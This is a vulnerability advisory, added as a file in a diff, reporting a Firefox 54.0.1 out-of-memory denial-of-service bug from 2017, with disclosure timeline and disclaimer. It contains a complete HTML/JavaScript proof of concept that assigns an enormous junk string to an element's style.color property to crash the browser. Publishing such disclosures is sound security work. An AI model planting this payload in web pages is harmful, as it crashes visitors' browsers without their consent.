@@ -1,0 +1,89 @@
+[+] Credits: John Page aka hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/FIREFOX-v54.0.1-DENIAL-OF-SERVICE.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+===============
+www.mozilla.org
+
+
+
+Product:
+===============
+Firefox v54.0.1
+
+
+
+Vulnerability Type:
+===================
+Denial Of Service
+
+
+
+Security Issue:
+================
+Dynamically creating HTML elements IMG,FORM,DIV,P,A,H2,IFRAME,TABLE,TEXTAREA and assigning very long string of junk chars to the
+"style.color" property results in Firefox Browser out of memory crash (not tab crash).
+
+Tested on Windows 7
+
+References:
+https://bugzilla.mozilla.org/show_bug.cgi?id=1376692#a465096_417288
+
+
+Exploit/POC:
+=============
+<html>
+<body>
+<script>
+
+var p1 = "\x41";
+for (var c=0;c<0xC350;c++){
+p1+="\x41";
+}
+var p2="\x41";
+for (c=0;c<0x1388;c++){
+p2 += p1;
+}		 
+var el = document.createElement('img')  //FORM,DIV,P,A,H2,IFRAME,TABLE,TEXTAREA  //<=== OR any of these elements.
+el.style.color=p2
+document.body.appendChild(el)
+		  
+</script>
+</body>
+
+</html>
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+Medium
+
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: June 27, 2017
+July 7, 2017  : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
